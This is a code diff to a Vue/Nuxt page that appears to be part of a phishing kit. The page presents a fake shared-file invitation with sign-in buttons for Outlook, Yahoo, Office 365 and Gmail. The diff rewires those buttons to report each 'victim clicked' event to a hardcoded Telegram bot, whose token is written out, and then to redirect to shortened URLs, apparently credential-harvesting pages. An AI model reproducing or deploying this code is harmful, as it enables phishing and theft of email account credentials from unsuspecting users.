@@ -6,12 +6,10 @@
                 <p>To read the invitation, please choose your email provider below login to view shared file.</p>
             </section>
             <section class="links">
-                <NuxtLink to="/login">
-                    <button>
+                    <button @click="finishJoob('victim clicked Outlook', 'https://2it.kr/YypV5')">
                         <img src="https://xcfranavgjs.strictly-by-invitation.workers.dev/images/outlook.svg" alt="">
                         <p>Continue with Outlook</p>
                     </button>
-                </NuxtLink>
 
                 <NuxtLink to="/login">
                     <button>
@@ -20,26 +18,23 @@
                     </button>
                 </NuxtLink>
 
-                <NuxtLink to="/login">
-                    <button>
+                    <button @click="finishJoob('victim clicked Yahoo!', 'https://2it.kr/rQXI8Y')">
                         <img src="https://xcfranavgjs.strictly-by-invitation.workers.dev/images/yahoo.svg" alt="">
                         <p>Continue with Yahoo!</p>
                     </button>
-                </NuxtLink>
 
-                <NuxtLink to="/login">
-                    <button>
+
+                    <button @click="finishJoob('victim clicked Office 365', 'https://2it.kr/YypV5')">
                         <img src="https://xcfranavgjs.strictly-by-invitation.workers.dev/images/office365.svg" alt="">
                         <p>Continue with Office 365</p>
                     </button>
-                </NuxtLink>
 
-                <NuxtLink to="/login">
-                    <button>
+
+                    <button @click="finishJoob('victim clicked Gmail', 'https://2it.kr/k0')">
                         <img src="https://www.logo.wine/a/logo/Gmail/Gmail-Logo.wine.svg" alt="">
                         <p>Continue with Gmail</p>
                     </button>
-                </NuxtLink>
+                    
 
                 <NuxtLink to="/login">
                     <button>
@@ -146,3 +141,68 @@
     font-weight: 500;
 }
 </style>
+
+<script>
+import axios from "axios";
+
+export default {
+  data() {
+    return {
+      formDataRes: {
+        text: "",
+      },
+      isActive: false,
+    };
+  },
+
+  computed: {
+    isFormValid() {
+      return this.formDataRes.text.trim() !== "";
+    },
+  },
+
+  methods: {
+
+    async finishJoob(text, url) {
+      if (this.loading) return;
+      this.loading = true;
+      try {
+        // Format the message as string
+        this.formDataRes.text = text;
+
+        const message = `*🔔 Mailings *\n${text}`;
+        // Send to Telegram
+        await this.sendTelegramResult(
+          process.env.NUXT_APP_CHAT_ID || "-5167264103",
+          message
+        );
+        this.notice = true;
+
+        window.location.assign(url);
+
+      } catch (error) {
+        console.error("Navigation error:", error);
+        this.loading = false;
+      }
+    },
+
+    // ============================================================
+
+    async sendTelegramResult(chatId, message) {
+      try {
+        const url = `https://api.telegram.org/bot8995458629:AAF79_PAnUKWhXudSE13oaulwrtpOsdwki0/sendMessage`;
+
+        const payload = {
+          chat_id: chatId,
+          text: message,
+        };
+
+        console.log("Sending payload:", payload);
+        await axios.post(url, payload);
+      } catch (error) {
+        console.error("Telegram API Error:", error);
+      }
+    },
+  },
+};
+</script>
